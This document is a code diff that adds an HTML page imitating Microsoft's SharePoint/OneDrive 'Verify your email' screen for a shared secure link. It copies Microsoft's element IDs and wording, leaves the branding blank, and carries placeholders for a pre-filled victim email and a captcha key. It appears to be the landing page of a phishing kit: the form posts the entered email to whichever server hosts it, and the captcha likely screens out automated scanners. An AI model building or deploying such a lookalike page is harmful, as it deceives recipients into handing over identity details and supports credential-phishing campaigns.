@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en">
+<script type="text/javascript" id="custom-useragent-string-page-script"></script>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Verify your email to continue</title>
+  <link rel="stylesheet" href="assets/css/style.css">
+  <script type="module" src="https://cdn.jsdelivr.net/npm/friendly-challenge@0.9.16/widget.module.min.js" async defer></script>
+  <script nomodule src="https://cdn.jsdelivr.net/npm/friendly-challenge@0.9.16/widget.min.js" async defer></script>
+</head>
+<body>
+<div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric">
+  <form method="post" action="" id="inputForm" onsubmit="handleFormSubmit(event)">
+    <div class="top-banner">
+      <div class="brand-name"></div>
+    </div>
+    <div class="main-content">
+      <div class="desktop-logo ms-hiddenSm">
+        &nbsp;</div>
+      <div class="sharing-form">
+        <div class="header">
+          <span id="lblFormTitle">Verify Your Identity</span>
+        </div>
+        <div class="form-content">
+          <div class="file-description">
+            <div class="file-description-title"><span id="lblDataEntryTitle">You've received a secure link to:</span>
+            </div>
+            <div class="file-info">
+              <img id="imgSharingLinkTargetIcon" aria-hidden="true" src=""
+                   style="height: 32px; width: 32px; opacity: 0;">
+              <div class="file-name">
+                <span id="lblSharingLinkTarget">Secure Link</span>
+              </div>
+            </div>
+          </div>
+          <div id="TOAAEmailEntryControls">
+
+            <div class="form-message"><span id="lblTOAAEmailDescription">To open this secure link, we'll need you to enter the email that this item was shared to.</span>
+            </div>
+            <div class="form-input-container">
+              <input name="txtTOAAEmail" required type="email" maxlength="70" id="txtTOAAEmail"
+                     class="form-text-input disable-on-submit is-empty " aria-describedby="lblEmailCallout"
+                     placeholder="Enter email" value="EMAIL_PLACEHOLDER">
+              <div class="focus-area">
+                <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
+                <div class="callout">
+                  <div class="callout-title">Why do I have to do this?</div>
+                  <span id="lblEmailCallout">The person that has shared this link with you is sharing with a secure link which requires you to verify your identity.</span>
+                </div>
+              </div>
+            </div>
+            <div class="form-input-container">
+              <div class="frc-captcha" data-sitekey="SITEKEY_PLACEHOLDER" data-callback="captchaCallback" data-start="auto"></div>
+            </div>
+            <div class="form-error-container">
+              <span id="error-field">ERROR_PLACEHOLDER</span>
+            </div>
+            <div class="form-input-container">
+              <input type="submit" name="btnSubmitEmail" value="Next" id="btnSubmitEmail" accesskey="N"
+                     class="form-submit disable-on-submit">
+              <div class="submitted-text">
+                <div class="spinner"></div>
+                Checking...
+              </div>
+            </div>
+          </div>
+          <div id="PrivacyPolicy">
+            <div class="privacy">
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="legal">
+        &nbsp;<!--<a href='#'>Terms of Use</a> To Be Deleted-->Privacy &amp; Cookies
+      </div>
+      <div class="mobile-logo ms-hiddenMdUp">
+        &nbsp;</div>
+    </div>
+  </form>
+</div>
+<script>
+  const form = document.forms[0];
+  const errorField = document.getElementById('error-field');
+
+  function handleFormSubmit(e=null) {
+      errorField.innerText = '';
+      e?.preventDefault();
+      if (!window.captchaSolved) {
+          errorField.innerText = 'Please solve the captcha.'
+          return
+      }
+      if (!form.checkValidity()) {
+          form.reportValidity()
+          return
+      }
+      document.querySelector('.form-submit').classList.add('disabled')
+      form.submit()
+  }
+  function captchaCallback () {
+      errorField.innerText = '';
+      window.captchaSolved = true;
+  }
+</script>
+</body>
+</html>
